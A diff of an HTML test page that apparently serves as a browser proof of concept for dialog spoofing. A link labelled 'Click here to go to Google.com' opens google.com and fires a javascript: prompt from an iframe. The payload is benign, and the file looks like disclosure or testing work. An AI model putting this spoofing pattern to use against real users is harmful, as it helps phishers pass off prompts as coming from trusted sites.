@@ -1,13 +1,24 @@
-
-
 <html>
-	<head></head>
-<body onbeforeunload="myFunction()">
-		<script>
+  <body>
+    <iframe id="iframe" src=""></iframe>
 
-function myFunction() {
-prompt("Please enter your name", "Harry Potter");
-}
-	</script>
-	</body>
+    <script>
+
+function exploit(){
+      window.open("https://www.google.com");
+
+	 var x = document.getElementById("iframe");
+      x.src = 'javascript:window.prompt();';}
+    
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+
+  </body>
 </html>
